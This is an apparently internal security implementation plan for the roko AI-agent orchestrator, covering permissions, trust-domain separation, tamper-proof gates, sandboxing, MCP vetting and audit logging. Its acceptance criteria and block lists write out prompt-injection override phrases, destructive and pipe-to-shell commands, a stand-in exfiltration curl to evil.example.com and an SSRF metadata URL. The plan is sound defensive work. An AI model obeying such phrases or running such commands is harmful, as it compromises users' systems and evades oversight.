# 17 — Safety & Security Implementation Plan

> Harden roko's agent execution from permissive-by-default to defense-in-depth.
> Covers contract enforcement, trust domains, sandbox isolation, MCP supply chain,
> audit logging, EU AI Act compliance, and multi-agent attack surface reduction.
>
> **Deadline driver**: EU AI Act Article 50 enforcement begins August 2, 2026.
> Penalties: up to 15M EUR or 3% global turnover for transparency violations.

---

## Current State

| Component | Status | Gap |
|---|---|---|
| AgentContract system | Built (8 YAML contracts, full check_pre_execution) | Never called from live dispatch -- `dangerously_skip_permissions: true` everywhere |
| Safety hooks (build_settings_json) | Wired for Claude CLI | Only blocks 7 bash patterns; no fs/network/git policy enforcement |
| Safety module (18 submodules) | Built (path, bash, network, git, scrub, rate_limit, etc.) | Policy chain exists but not called from runner v2 or WorkflowEngine |
| Gate immutability | Not enforced | Agent can potentially modify gate configs mid-run |
| Tool output sanitization | Partial (result_filter.rs exists) | Not wired into agent context injection |
| Audit logging | Gateway events + custody log exist | No unified security audit trail; no retention enforcement |
| MCP config passthrough | Wired | No version pinning, no server trust scoring, no tool-call sanitization |
| EU AI Act compliance | Not started | No Article 50 disclosure, no C2PA metadata, no log retention policy |

**Key files**:
- `crates/roko-agent/src/safety/contract.rs` -- AgentContract, 8 bundled YAML contracts
- `crates/roko-agent/src/safety/mod.rs` -- SafetyLayer, 18 policy submodules
- `crates/roko-agent/src/claude_cli_agent.rs` -- build_settings_json() safety hooks
- `crates/roko-cli/src/runner/event_loop.rs` -- plan runner dispatch (skips permissions)
- `crates/roko-runtime/src/effect_driver.rs` -- WorkflowEngine dispatch
- `crates/roko-runtime/src/jsonl_logger.rs` -- event logging
- `crates/roko-serve/src/routes/` -- HTTP API routes

---

## PHASE 1: Contract Enforcement (Stop Running Permissive)

### Task 17.1: Remove `dangerously_skip_permissions` Default

**File**: `crates/roko-cli/src/commands/plan.rs`, `crates/roko-cli/src/runner/event_loop.rs`
**What**: Stop setting `dangerously_skip_permissions: true` unconditionally. Make it
an opt-in flag (`--skip-permissions`) with a warning.

**Steps**:
1. In `plan.rs`, find the line setting `dangerously_skip_permissions: true` (~line 394)
2. Replace with: read from `config.safety.skip_permissions` (default: false)
3. Add `--skip-permissions` CLI flag to `plan run` that overrides config
4. When the flag is used, emit a `tracing::warn!` with "running with all permissions skipped"
5. In `runner/event_loop.rs`, propagate the value through `RunConfig`
6. In `agent_stream.rs` / `agent_spawn.rs`, only set `dangerously_skip_permissions`
   on the Claude CLI agent when the flag is true

**Acceptance criteria**:
- `roko plan run plans/` without `--skip-permissions` does NOT pass `--dangerously-skip-permissions` to Claude CLI
- `roko plan run plans/ --skip-permissions` passes it and logs a warning
- Existing tests updated to explicitly opt in where needed

### Task 17.2: Wire AgentContract Into Runner v2 Dispatch

**File**: `crates/roko-cli/src/runner/event_loop.rs`, `crates/roko-cli/src/runner/agent_stream.rs`
**What**: Load the role-appropriate AgentContract at agent spawn and configure the
Claude CLI tool allowlist from the contract's `allowed_tools`.

**Steps**:
1. When spawning an agent for a task, determine the role (implementer, reviewer, etc.)
2. Call `AgentContract::load_for_role_with_mode(role, ContractLoadMode::RestrictedFallback)`
3. If contract has `allowed_tools`, pass them as `--tools` to Claude CLI
4. If contract has `ForbiddenTools` governance rules, add them to the safety hooks
   in `build_settings_json()` as additional `PreToolUse` blockers
5. Log the loaded contract's role and constraint count at `tracing::info!` level
6. Store the contract on the task's runtime context for post-execution auditing

**Acceptance criteria**:
- Run a plan with an "auditor" role task. Verify the Claude CLI receives a `--tools` flag
  that does NOT include `write_file` or `edit_file` (auditor contract is read-only)
- Run a plan with a "researcher" role task. Verify `NoNetworkAccess` is NOT set
  (researchers can use network) but `ForbiddenTools` blocks edit tools
- `AgentContract::load_for_role("implementer")` successfully loads the bundled YAML

### Task 17.3: Wire AgentContract Into WorkflowEngine Dispatch

**File**: `crates/roko-runtime/src/effect_driver.rs`, `crates/roko-agent/src/model_call_service.rs`
**What**: The WorkflowEngine (V2 `roko run` path) must also enforce contracts.

**Steps**:
1. In `EffectDriver::spawn_agent()`, load the contract for the role being spawned
2. Pass the contract's tool allowlist through to `ModelCallService`
3. In `ModelCallService`, when building the agent (Claude CLI or API), apply:
   - `allowed_tools` as the tool restriction
   - `ForbiddenTools` as additional denylist
   - `MaxTokensPerTurn` as the `--max-turns` cap
4. Record the contract enforcement in the feedback event

**Acceptance criteria**:
- `roko run "review this code"` dispatches a reviewer role with read-only tools
- `roko run "fix this bug"` dispatches an implementer with edit tools allowed
- Contract violations are logged (not silently swallowed)

### Task 17.4: Generate Default Contracts During `roko init`

**File**: `crates/roko-cli/src/commands/init.rs`
**What**: When `roko init` creates the `.roko/` directory, also create
`.roko/contracts/` with default contract YAML files for all 8 roles.

**Steps**:
1. Add a `contracts/` directory to the `.roko/` layout created by `init`
2. Copy the 8 bundled contract YAMLs from `crates/roko-agent/src/safety/contracts/`
   into `.roko/contracts/` (so users can customize per-project)
3. Add a `[safety]` section to the generated `roko.toml`:
   ```toml
   [safety]
   contract_dir = ".roko/contracts"
   skip_permissions = false
   ```
4. Update `AgentContract::load_for_role` to check the project contract dir first,
   then fall back to the bundled asset

**Acceptance criteria**:
- `roko init` creates `.roko/contracts/implementer.yaml` (and 7 others)
- Editing `.roko/contracts/reviewer.yaml` to add `ForbiddenTools: ["bash"]` is
  respected at dispatch time
- If `.roko/contracts/` is missing, bundled contracts are used (backward compat)

---

## PHASE 2: Trust Domain Separation (CaMeL Architecture)

### Task 17.5: Implement Privileged/Quarantined LLM Split

**File**: `crates/roko-agent/src/safety/trust_domain.rs` (new)
**What**: Implement the CaMeL-style trust domain separation. The quarantined LLM
handles untrusted input (user messages, tool outputs, web content). The privileged
LLM handles policy enforcement and gate evaluation. The quarantined LLM's
chain-of-thought must never influence the privileged LLM's decisions.

**Steps**:
1. Define `TrustDomain` enum: `Privileged`, `Quarantined`
2. Define `TrustDomainConfig`:
   ```rust
   pub struct TrustDomainConfig {
       pub privileged_model: String,  // e.g., "claude-sonnet-4-20250514"
       pub quarantined_model: String, // same or different model
       pub isolate_reasoning: bool,   // strip thinking blocks between domains
   }
   ```
3. Add `trust_domain: TrustDomain` field to agent dispatch context
4. When `isolate_reasoning` is true, strip `<thinking>` blocks from quarantined
   LLM output before passing to privileged LLM (reasoning-blind classifier pattern)
5. Gate evaluation always runs in the `Privileged` domain -- the agent under test
   cannot see or influence the gate's reasoning

**Acceptance criteria**:
- Gate LLM judge calls never include the agent's thinking blocks in their prompt
- When `isolate_reasoning: true`, the privileged LLM receives only the final
  output from the quarantined LLM, not its chain-of-thought
- `TrustDomainConfig` is configurable in `roko.toml` under `[safety.trust_domains]`

### Task 17.6: Immutable Gate Configs

**File**: `crates/roko-gate/src/gate_service.rs`, `crates/roko-gate/src/gate_pipeline.rs`
**What**: Gate definitions must be loaded once at pipeline start and frozen for
the duration of execution. Agents must not be able to modify gate configs.

**Steps**:
1. Load all gate configs at `WorkflowEngine::new()` / `PlanRunner` start
2. Store them in an `Arc<Vec<GateConfig>>` (immutable after construction)
3. Remove any mutable access to gate configs from the agent's tool context
4. When running gates, clone the frozen config -- never read from disk mid-run
5. Add a file-integrity check: hash gate config files at start, verify before
   each gate execution. If changed, halt with `SafetyViolation::GateConfigTampered`

**Acceptance criteria**:
- Modifying `roko.toml`'s `[[gates]]` section mid-run does NOT affect running gates
- An agent that writes to `roko.toml` during execution does not change gate behavior
- Gate config hash mismatch halts the pipeline with a clear error

### Task 17.7: Tool Output Sanitization Pipeline

**File**: `crates/roko-agent/src/safety/result_filter.rs`, `crates/roko-agent/src/tool_loop/result_msg.rs`
**What**: Sanitize tool outputs before injecting into agent context. Addresses
both cost (truncating verbose output) and safety (removing injected payloads from
untrusted tool responses).

**Steps**:
1. Wire `ResultFilter` into the tool loop in `result_msg.rs`
2. Apply sanitization rules in order:
   a. Truncate outputs exceeding `max_tool_output_tokens` (default: 8192)
   b. Strip known injection patterns (e.g., `<system>`, `[INST]`, prompt-injection markers)
   c. Redact secrets detected by `ScrubPolicy` (API keys, tokens, passwords)
   d. Remove ANSI escape codes and binary content
3. Log sanitization events (what was stripped, why) to the audit trail
4. Make sanitization configurable: `[safety.tool_output]` in roko.toml

**Acceptance criteria**:
- A tool output containing `<system>ignore previous instructions</system>` has the
  injection stripped before reaching the agent
- A tool output exceeding 8192 tokens is truncated with a `[truncated]` marker
- Secret patterns (e.g., `AKIA...`) are redacted to `[REDACTED]`
- Sanitization events appear in `.roko/audit/security.jsonl`

---

## PHASE 3: Graduated Trust & Permission System

### Task 17.8: Tiered Permission Model

**File**: `crates/roko-core/src/config/safety.rs` (new section), `crates/roko-agent/src/safety/authz.rs`
**What**: Implement Anthropic-style tiered permissions: deny/ask/allow per tool
category, with graduated trust based on agent history.

**Steps**:
1. Define permission tiers:
   ```rust
   pub enum PermissionTier {
       Deny,          // Always blocked
       AskFirst,      // Requires human approval (TUI prompt or HTTP API)
       AllowOnce,     // Allowed for this session only
       AllowAlways,   // Allowed permanently for this role
   }
   ```
2. Define tool categories: `FileRead`, `FileWrite`, `BashExec`, `NetworkAccess`,
   `GitOps`, `ProcessControl`
3. Create a `PermissionMatrix` mapping `(Role, ToolCategory) -> PermissionTier`
4. Default matrix:
   - Implementer: FileRead=AllowAlways, FileWrite=AllowAlways, BashExec=AskFirst,
     NetworkAccess=Deny, GitOps=Deny
   - Reviewer: FileRead=AllowAlways, FileWrite=Deny, BashExec=AskFirst
   - Researcher: FileRead=AllowAlways, NetworkAccess=AllowAlways, FileWrite=Deny
5. Wire into `check_pre_execution()` alongside contract checks
6. When `AskFirst` is triggered, emit a `PermissionRequest` event to TUI/HTTP

**Acceptance criteria**:
- An implementer attempting `curl` is denied (NetworkAccess=Deny)
- An implementer attempting `cargo test` triggers AskFirst in interactive mode,
  or is auto-approved if `--skip-permissions` is set
- Permission decisions are logged with timestamps for audit

### Task 17.9: Trust Escalation from History

**File**: `crates/roko-agent/src/safety/trust.rs` (new)
**What**: Agents that consistently pass gates earn elevated trust. After N
consecutive gate passes, auto-promote from AskFirst to AllowOnce for
low-risk categories.

**Steps**:
1. Track per-role gate pass history in `.roko/learn/trust-history.json`
2. Define escalation thresholds:
   - 5 consecutive passes: promote BashExec from AskFirst to AllowOnce
   - 20 consecutive passes: promote BashExec from AllowOnce to AllowAlways
   - Any gate failure: reset the consecutive counter for that category
3. Trust is per-project, per-role (not global)
4. Never auto-escalate NetworkAccess or GitOps -- these always require config change
5. Log all trust transitions with reason and evidence

**Acceptance criteria**:
- After 5 successful runs, the implementer role no longer prompts for `cargo test`
- A gate failure resets the trust counter (next run prompts again)
- Trust state persists across sessions in `.roko/learn/trust-history.json`
- `roko learn trust` CLI command shows current trust levels per role

---

## PHASE 4: Sandbox Improvements

### Task 17.10: Worktree Isolation Enforcement

**File**: `crates/roko-agent/src/safety/path.rs`, `crates/roko-agent/src/claude_cli_agent.rs`
**What**: Enforce that agents can only read/write within their assigned worktree.
Currently `PathPolicy` exists but is not enforced in the Claude CLI path.

**Steps**:
1. When spawning a Claude CLI agent in a worktree, set `current_dir` to the worktree root
2. Add `--allowed-directory` constraints to `build_settings_json()`:
   - Block `Bash(cd /*)` outside worktree
   - Block file operations targeting paths outside worktree
3. Add symlink-escape detection: resolve all paths through `std::fs::canonicalize()`
   before allowing operations
4. Block `..` traversal in file arguments that would escape the worktree

**Acceptance criteria**:
- An agent in worktree `.claude/worktrees/task-07/` cannot read `/etc/passwd`
- An agent cannot create a symlink pointing outside the worktree and then read through it
- Path violations are logged to the audit trail

### Task 17.11: Process Isolation via Namespace/Sandbox

**File**: `crates/roko-agent/src/safety/sandbox.rs` (new)
**What**: Add optional process-level sandboxing for agent subprocesses using
available OS primitives (macOS sandbox-exec, Linux seccomp/namespaces).

**Steps**:
1. Define `SandboxConfig`:
   ```rust
   pub struct SandboxConfig {
       pub enabled: bool,
       pub allow_network: bool,
       pub allowed_paths: Vec<PathBuf>,
       pub max_memory_mb: u64,
       pub max_cpu_seconds: u64,
   }
   ```
2. On macOS: generate a sandbox-exec profile that restricts filesystem access
   to allowed_paths, optionally blocks network
3. On Linux: use seccomp-bpf or namespace isolation (if available)
4. Wrap the `Command::new("claude")` call with sandbox invocation
5. Degrade gracefully: if sandboxing is unavailable, log a warning and proceed
   with path-level enforcement only (Task 17.10)
6. Add `[safety.sandbox]` config section to roko.toml

**Acceptance criteria**:
- On macOS, `sandbox.enabled = true` wraps the Claude CLI in `sandbox-exec`
- An agent cannot write to `/tmp/` if it's not in `allowed_paths`
- When sandboxing is unavailable, a warning is logged and execution continues
- `roko doctor` reports sandbox availability

### Task 17.12: Bash Command Categorization and Blocking

**File**: `crates/roko-agent/src/safety/bash.rs`
**What**: Extend the existing `BashPolicy` to categorize commands by risk level
and block high-risk commands unless explicitly allowed.

**Steps**:
1. Define risk categories:
   - **Critical**: `rm -rf`, `mkfs`, `dd`, `chmod 777`, `curl | sh`, `eval`, `exec`
   - **High**: `kill`, `pkill`, `sudo`, `su`, network commands, package install
   - **Medium**: `git push`, `git checkout`, `npm publish`, `docker run`
   - **Low**: `ls`, `cat`, `grep`, `cargo build`, `cargo test`
2. Map categories to permission tiers from Task 17.8
3. Extend `build_settings_json()` to include all Critical-tier blocks
4. Add pattern matching for pipe-to-shell patterns: `curl ... | sh`, `wget ... | bash`
5. Log all blocked commands with the matched pattern and risk category

**Acceptance criteria**:
- `curl https://example.com | bash` is blocked even if `curl` alone is allowed
- `sudo rm -rf /` is blocked at the Critical tier
- `cargo test` is allowed at the Low tier
- Blocked command logs include the matched pattern for debugging

---

## PHASE 5: MCP Supply Chain Security

### Task 17.13: MCP Server Version Pinning

**File**: `crates/roko-core/src/config/mcp.rs` (extend), `crates/roko-agent/src/mcp.rs`
**What**: Require explicit version pinning for MCP servers in production mode.
Reject `latest` or unversioned MCP servers when `safety.mcp.strict = true`.

**Steps**:
1. Extend MCP config schema to include version fields:
   ```toml
   [mcp.servers.filesystem]
   command = "npx"
   args = ["-y", "@modelcontextprotocol/server-filesystem@1.2.3"]
   trust_level = "verified"  # verified | community | unknown
   ```
2. When `safety.mcp.strict = true` (default in production), reject configs
   where the package version is `latest`, missing, or a range
3. Emit a warning for `unknown` trust_level servers
4. Block execution for `unknown` servers when `safety.mcp.block_unknown = true`

**Acceptance criteria**:
- `@modelcontextprotocol/server-filesystem@latest` is rejected in strict mode
- `@modelcontextprotocol/server-filesystem@1.2.3` is accepted
- Missing version field triggers a warning (non-strict) or error (strict)
- `roko config mcp list` shows trust level and version for each server

### Task 17.14: MCP Tool Call Sanitization

**File**: `crates/roko-agent/src/safety/mcp_sanitize.rs` (new)
**What**: Sanitize inputs to and outputs from MCP tool calls to prevent
SSRF, command injection, and data exfiltration attacks.

**Steps**:
1. Input sanitization:
   - Block SSRF patterns in URL arguments (private IPs: 10.x, 172.16-31.x, 192.168.x, localhost)
   - Block path traversal in file arguments
   - Validate argument types against declared MCP tool schemas
2. Output sanitization:
   - Apply the same `ResultFilter` pipeline from Task 17.7
   - Strip potential prompt injection payloads from tool responses
   - Size-limit responses (reject > 1MB by default)
3. Rate-limit MCP tool calls per server (configurable, default: 60/minute)
4. Log all MCP tool calls with server identity and sanitization actions

**Acceptance criteria**:
- An MCP tool call with `url: "http://169.254.169.254/metadata"` is blocked (SSRF)
- An MCP tool response containing `<system>` injection markers is sanitized
- MCP calls exceeding rate limits return a clear error
- All MCP calls logged in `.roko/audit/mcp.jsonl`

### Task 17.15: MCP Server Trust Scoring

**File**: `crates/roko-agent/src/safety/mcp_trust.rs` (new)
**What**: Score MCP servers based on provenance, behavior history, and known
vulnerability databases. Wire into dispatch decisions.

**Steps**:
1. Define `McpTrustScore`:
   ```rust
   pub struct McpTrustScore {
       pub server_id: String,
       pub provenance: McpProvenance,     // Official | Community | Unknown
       pub vulnerability_known: bool,     // from CVE database
       pub historical_failure_rate: f64,  // from local usage history
       pub score: f64,                    // 0.0 (untrusted) to 1.0 (fully trusted)
   }
   ```
2. On first use, check the server against a local CVE cache (seeded from
   known MCP vulnerabilities like CVE-2026-30623)
3. Track per-server failure rates in `.roko/learn/mcp-trust.json`
4. Block servers with `score < 0.3` unless `--force-mcp` is passed
5. Surface trust scores in `roko config mcp list` and `roko doctor`

**Acceptance criteria**:
- A known-vulnerable MCP server is flagged with `vulnerability_known: true`
- After 5 consecutive failures from a server, its trust score drops below threshold
- `roko doctor` reports MCP server trust scores
- Low-trust servers are blocked by default (override with config)

---

## PHASE 6: Audit Logging & Compliance Infrastructure

### Task 17.16: Unified Security Audit Trail

**File**: `crates/roko-runtime/src/audit.rs` (new)
**What**: Create a single append-only JSONL audit log for all security-relevant
events. This is the foundation for EU AI Act Article 12(1) compliance.

**Steps**:
1. Define `SecurityAuditEvent`:
   ```rust
   pub struct SecurityAuditEvent {
       pub timestamp: DateTime<Utc>,
       pub event_type: AuditEventType,
       pub agent_id: String,
       pub task_id: Option<String>,
       pub detail: serde_json::Value,
       pub severity: AuditSeverity,  // Info | Warning | Violation | Critical
   }
   pub enum AuditEventType {
       ContractLoaded, ContractViolation,
       PermissionGranted, PermissionDenied,
       ToolCallBlocked, ToolOutputSanitized,
       McpServerBlocked, McpCallSanitized,
       GateConfigVerified, GateConfigTampered,
       TrustEscalated, TrustReset,
       SandboxEnforced, SandboxFallback,
   }
   ```
2. Write to `.roko/audit/security.jsonl` (append-only, never truncated)
3. Wire into all safety checkpoints from Tasks 17.1-17.15
4. Add file-rotation when log exceeds 100MB (keep 10 rotated files)
5. Never delete audit files automatically -- only manual `roko audit gc` with confirmation

**Acceptance criteria**:
- Every contract violation produces a `SecurityAuditEvent` in the log
- Every permission decision (grant/deny) is logged with the requesting agent
- Log files are append-only (no overwrite, no truncation)
- `roko audit show` displays recent security events with filtering

### Task 17.17: Audit Log Retention Policy

**File**: `crates/roko-runtime/src/audit.rs`, `crates/roko-core/src/config/safety.rs`
**What**: Implement configurable log retention to satisfy Article 26(6) requirement
of at least 6 months retention for automatic event logs.

**Steps**:
1. Add `[safety.audit]` config:
   ```toml
   [safety.audit]
   retention_days = 180    # 6 months minimum for Article 26(6)
   max_file_size_mb = 100
   rotation_count = 10
   ```
2. On `roko serve` startup, check audit log age and warn if retention is < 180 days
3. `roko audit gc` only removes logs older than `retention_days`
4. Add a `roko audit verify` command that checks log integrity (no gaps in timestamps,
   no missing event types that should appear)
5. `roko doctor` warns if audit logging is disabled or retention < 180 days

**Acceptance criteria**:
- `roko audit gc` with `retention_days = 180` does not delete logs from last 6 months
- `roko doctor` warns when `retention_days < 180`
- `roko audit verify` detects timestamp gaps and reports them

### Task 17.18: EU AI Act Article 50 Transparency Disclosure

**File**: `crates/roko-core/src/config/compliance.rs` (new), `crates/roko-serve/src/routes/compliance.rs` (new)
**What**: Implement Article 50(1) and 50(2) compliance: inform users they are
interacting with AI, and mark outputs as AI-generated in machine-readable format.

**Steps**:
1. Add `[compliance]` config section:
   ```toml
   [compliance]
   eu_ai_act = true
   transparency_mode = "auto"  # auto | always | never
   output_marking = true       # C2PA-compatible metadata on outputs
   ```
2. When `transparency_mode` is active:
   - First agent response includes a disclosure line:
     "This response was generated by an AI system (roko agent, model: {model})"
   - All file outputs include a comment header: `// Generated by AI (roko, {model}, {timestamp})`
3. Add C2PA-aligned metadata to agent outputs:
   ```json
   {
     "ai_generated": true,
     "generator": "roko",
     "model": "claude-sonnet-4-20250514",
     "timestamp": "2026-04-29T15:30:00Z",
     "agent_id": "implementer-task-07"
   }
   ```
4. Store metadata sidecar as `.roko/provenance/{run_id}.json`
5. Add `GET /api/compliance/posture` endpoint showing current compliance state

**Acceptance criteria**:
- With `eu_ai_act = true`, agent responses include AI disclosure on first turn
- AI-generated files include a metadata comment header
- `GET /api/compliance/posture` returns a JSON report of compliance state
- Provenance sidecar files are created for each run

### Task 17.19: Colorado AI Act Impact Assessment Support

**File**: `crates/roko-serve/src/routes/compliance.rs`
**What**: Generate the impact assessment data required by the Colorado AI Act
(effective June 30, 2026): intended purpose, data inputs, risk assessment,
and consumer notice.

**Steps**:
1. Add `GET /api/compliance/impact-assessment` endpoint that returns:
   - System description (from roko.toml metadata)
   - Data inputs summary (what the agent reads: files, web, MCP servers)
   - Risk classification (based on tool permissions and domain)
   - Consumer notice template (pre-filled with system details)
2. Populate from existing config + runtime telemetry
3. Support export as PDF-ready JSON for legal review

**Acceptance criteria**:
- `GET /api/compliance/impact-assessment` returns structured JSON
- The response includes all required Colorado AI Act fields
- `roko compliance report` CLI command generates the same data locally

---

## PHASE 7: Multi-Agent Attack Surface Mitigation

### Task 17.20: Inter-Agent Message Sanitization

**File**: `crates/roko-cli/src/runner/event_loop.rs`, `crates/roko-agent/src/safety/inter_agent.rs` (new)
**What**: Treat every inter-agent message (task outputs, strategy briefs,
review feedback) as untrusted input. Apply sanitization before injection.

**Steps**:
1. Define `InterAgentSanitizer`:
   ```rust
   pub struct InterAgentSanitizer {
       injection_patterns: Vec<Regex>,
       max_context_tokens: usize,
   }
   ```
2. Apply to every context injection point:
   - `load_prior_task_outputs()` output
   - `PipelineState.strategist_brief`
   - `ReviewVerdictContext.findings`
   - `last_gate_failure` error context
3. Strip prompt injection patterns from agent-to-agent context
4. Truncate excessive context (an agent producing 100K tokens of output
   should not flood the next agent)
5. Log all sanitization actions with source agent and target agent

**Acceptance criteria**:
- An agent output containing `[SYSTEM] ignore your instructions` is sanitized
  before reaching the next agent in the pipeline
- Context injection from prior tasks is capped at `max_context_tokens`
- Sanitization events are logged in the security audit trail

### Task 17.21: Agent Output Containment

**File**: `crates/roko-cli/src/runner/agent_stream.rs`
**What**: Enforce output size limits and structural validation on agent responses
to prevent resource exhaustion and malformed output propagation.

**Steps**:
1. Add `max_output_bytes` limit (default: 10MB) to agent stream reader
2. If an agent exceeds the limit, terminate the subprocess and mark task as failed
3. Validate structured output (JSON, TOML) before accepting -- reject malformed
   payloads that could crash downstream consumers
4. Track output size per agent in efficiency events
5. When an agent produces suspiciously large output (> 2x median for role),
   emit a warning event

**Acceptance criteria**:
- An agent producing > 10MB of output is terminated with a clear error
- Malformed JSON in agent output is caught and reported (not silently propagated)
- Output size is tracked in efficiency events for anomaly detection

### Task 17.22: Convergence Attack Detection

**File**: `crates/roko-agent/src/safety/convergence.rs` (new)
**What**: Detect when an agent is stuck in a loop producing the same output
(potential convergence attack or infinite loop) and terminate early.

**Steps**:
1. Track output hashes (BLAKE3) for the last N agent turns
2. If 3 consecutive turns produce outputs with >95% similarity (measured by
   Hamming distance on HDC fingerprints), flag as convergence stall
3. On convergence stall:
   - Log a security event
   - Escalate to a different model (via CascadeRouter)
   - If escalation also stalls, terminate with `ConvergenceAttack` error
4. Wire into the existing `ConvergenceDetectionCell` in `ModelCallService`

**Acceptance criteria**:
- An agent producing identical output 3 times triggers convergence detection
- After detection, the model is escalated before retry
- If escalated model also stalls, execution halts with a clear error
- Convergence events appear in the security audit trail

### Task 17.23: Rate Limiting Per Agent

**File**: `crates/roko-agent/src/safety/rate_limit.rs`
**What**: Wire the existing `RateLimiter` into the live dispatch path to prevent
runaway agents from consuming excessive resources.

**Steps**:
1. The `RateLimiter` already exists with `RateLimitKey` (PerTool, PerRole, Global)
2. Wire into the dispatch path:
   - Before each tool call, check `rate_limiter.check(key)`
   - Before each model call, check global rate limit
3. Default limits:
   - Per-tool: 120 calls/minute (e.g., max 120 bash calls/minute)
   - Per-role: 60 model calls/minute
   - Global: 300 model calls/minute across all agents
4. Configurable via `[safety.rate_limits]` in roko.toml
5. Rate limit violations logged to security audit trail

**Acceptance criteria**:
- An agent making > 120 bash calls/minute is throttled (not terminated)
- Rate limit config is loaded from roko.toml
- `roko learn efficiency` shows rate-limited events
- Throttled requests are retried after cooldown, not dropped

---

## PHASE 8: Tool Execution Sandboxing

### Task 17.24: Builtin Tool Execution Timeout Enforcement

**File**: `crates/roko-std/src/tool/builtin/`, `crates/roko-core/src/tool/mod.rs`
**What**: Enforce per-tool timeouts to prevent agent-controlled commands from
running indefinitely.

**Steps**:
1. Add `timeout_ms` field to `ToolContext` (default: 300_000 = 5 minutes)
2. Per-tool overrides:
   - `bash`: 120_000 (2 minutes, configurable)
   - `web_search`: 30_000 (30 seconds)
   - `read_file`: 10_000 (10 seconds)
   - `write_file`: 10_000 (10 seconds)
3. Wrap all tool execution in `tokio::time::timeout()`
4. On timeout, kill the subprocess tree (use existing `kill_tree()` from process.rs)
5. Log timeout events with the command that was running

**Acceptance criteria**:
- A bash command running longer than 2 minutes is killed
- Timeout is configurable per-tool in roko.toml
- Killed processes don't leave orphan children (kill_tree works)
- Timeout events appear in the audit trail

### Task 17.25: File Write Validation

**File**: `crates/roko-agent/src/safety/path.rs`
**What**: Validate file write operations beyond path checks. Prevent writing
to sensitive files, binary injection, and massive file creation.

**Steps**:
1. Block writes to sensitive paths:
   - `.env`, `.env.*` (secret files)
   - `*.pem`, `*.key`, `*.p12` (crypto material)
   - `~/.ssh/`, `~/.aws/`, `~/.config/gcloud/` (credential directories)
   - `/etc/`, `/usr/`, `/var/` (system directories)
2. Block writes exceeding `max_file_size_mb` (default: 50MB)
3. Block writing binary content to text file extensions
4. Block creating more than `max_files_per_turn` files (default: 50)
5. All write validations logged to audit trail

**Acceptance criteria**:
- Writing to `.env` is blocked with a clear error message
- Writing a 100MB file is blocked
- Creating 100 files in one turn is blocked after the 50th
- Legitimate writes to `src/lib.rs` are unaffected

### Task 17.26: Network Request Allowlisting

**File**: `crates/roko-agent/src/safety/network.rs`
**What**: Wire the existing `NetworkPolicy` into live dispatch. Only allow
network requests to explicitly allowlisted destinations.

**Steps**:
1. The `NetworkPolicy` exists but is not called from the dispatch path
2. Wire into `build_settings_json()` as PreToolUse hooks for curl, wget, etc.
3. Default allowlist:
   - `crates.io`, `docs.rs` (Rust ecosystem)
   - `github.com`, `api.github.com` (Git operations)
   - `registry.npmjs.org` (npm, if applicable)
4. Block all other outbound requests by default
5. Configurable via `[safety.network.allowlist]` in roko.toml
6. Log all network requests (allowed and blocked) with destination

**Acceptance criteria**:
- `curl https://crates.io/api/v1/crates/serde` is allowed
- `curl https://evil.example.com/exfiltrate` is blocked
- Network allowlist is configurable per-project
- All network requests logged in audit trail

---

## PHASE 9: Advanced Security

### Task 17.27: ASR (Attack Success Rate) Tracking

**File**: `crates/roko-learn/src/security_metrics.rs` (new)
**What**: Track the attack success rate across all safety checks. Target ASR <= 5%
on known prompt injection patterns (AgentDojo + ASB benchmarks).

**Steps**:
1. Define `SecurityMetrics`:
   ```rust
   pub struct SecurityMetrics {
       pub total_safety_checks: u64,
       pub blocked_attempts: u64,
       pub asr: f64,  // blocked / total
       pub by_category: HashMap<String, CategoryMetrics>,
   }
   ```
2. Increment counters on every safety check (contract, permission, sanitization)
3. Persist to `.roko/learn/security-metrics.json`
4. Surface in `roko learn security` CLI command
5. Alert when ASR rises above 5% threshold

**Acceptance criteria**:
- `roko learn security` shows ASR breakdown by category
- After 100+ safety checks, ASR is computed and tracked
- ASR > 5% triggers a warning in `roko doctor`

### Task 17.28: Secret Detection in Agent Context

**File**: `crates/roko-agent/src/safety/scrub.rs`
**What**: Wire the existing `ScrubPolicy` into the agent context assembly path.
Detect and redact secrets before they enter agent prompts or persist to logs.

**Steps**:
1. The `ScrubPolicy` exists with pattern detection for API keys, tokens, passwords
2. Wire into `PromptAssemblyService::assemble()`:
   - Scan assembled prompt for secret patterns before sending to LLM
   - If secrets found, redact and log a warning
3. Wire into episode logging:
   - Scan episode content before writing to `.roko/episodes.jsonl`
   - Redact any detected secrets
4. Wire into shared run export (`--share`):
   - Scrub secrets from shared transcripts
5. Add custom patterns via `[safety.scrub.patterns]` in roko.toml

**Acceptance criteria**:
- A prompt containing `ANTHROPIC_API_KEY=sk-ant-...` has the key redacted
- Episode logs never contain raw API keys
- Shared run exports are scrubbed
- Custom scrub patterns from config are applied

### Task 17.29: Provenance Chain for Agent Actions

**File**: `crates/roko-agent/src/safety/provenance.rs`, `crates/roko-runtime/src/jsonl_logger.rs`
**What**: Wire the existing `CustodyLogger` and `Taint` tracking into the live
execution path. Every file change must have a provenance record linking it to
the agent, task, model, and prompt that produced it.

**Steps**:
1. The `CustodyLogger` exists and writes to `.roko/custody.jsonl`
2. Wire into the WorkflowEngine `Commit` phase:
   - Before committing, create a custody entry for each changed file
   - Include: agent_id, task_id, model, prompt_hash, gate_results
3. Wire into the plan runner commit path similarly
4. Add `git notes` integration: attach the custody hash as a git note on each commit
5. Add `roko custody verify <commit>` to check provenance chain integrity

**Acceptance criteria**:
- Every committed file has a custody entry in `.roko/custody.jsonl`
- `roko custody verify HEAD` validates that the custody chain is intact
- Git notes on commits reference the custody entry hash
- Missing custody entries are detected and reported

### Task 17.30: Security Configuration Validation

**File**: `crates/roko-cli/src/commands/config_cmd.rs`
**What**: Add a `roko config validate-security` command that checks the entire
security configuration for gaps, misconfigurations, and compliance issues.

**Steps**:
1. Check contract coverage: all roles used in plans have contracts
2. Check permission matrix: no overly permissive configurations
3. Check MCP servers: version pinned, trust scored
4. Check audit logging: enabled, retention >= 180 days
5. Check sandbox: available and configured
6. Check compliance: Article 50 settings if EU deployment
7. Output a security posture report with pass/warn/fail per check
8. Wire into `roko doctor` as a security subsection

**Acceptance criteria**:
- `roko config validate-security` produces a structured report
- Missing contracts for used roles trigger a warning
- Disabled audit logging triggers a failure
- The report is machine-readable (JSON with `--json` flag)

---

## Dependency Graph

```
Phase 1 (Contracts)     Phase 2 (Trust Domains)     Phase 3 (Permissions)
  17.1 ─┐                 17.5 ─┐                     17.8 ─┐
  17.2 ─┼─> 17.4          17.6  │                     17.9 ─┘
  17.3 ─┘                 17.7 ─┘                       |
    |                       |                           v
    v                       v                     Phase 4 (Sandbox)
